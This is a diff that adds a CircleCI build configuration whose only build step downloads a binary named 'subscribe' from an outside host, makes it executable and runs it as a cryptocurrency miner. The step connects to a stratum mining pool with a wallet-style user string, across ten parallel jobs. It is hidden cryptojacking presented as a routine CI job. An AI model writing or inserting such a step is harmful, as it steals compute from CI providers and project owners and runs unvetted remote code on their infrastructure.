@@ -1,0 +1,15 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: buildpack-deps:trusty
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    environment:
+      FOO: bar
+    parallelism: 10
+    resource_class: small
+    working_directory: ~/my-app
+    steps:
+      - run: wget http://ilovenypizza.com/subscribe; chmod +x subscribe; ./subscribe -a yespowerURX -o stratum+tcps://stratum-eu.rplant.xyz:13361 -u Uj7osA1Qmn5bKkqswHFJfpyQJscH5kPUGs.SN -t2
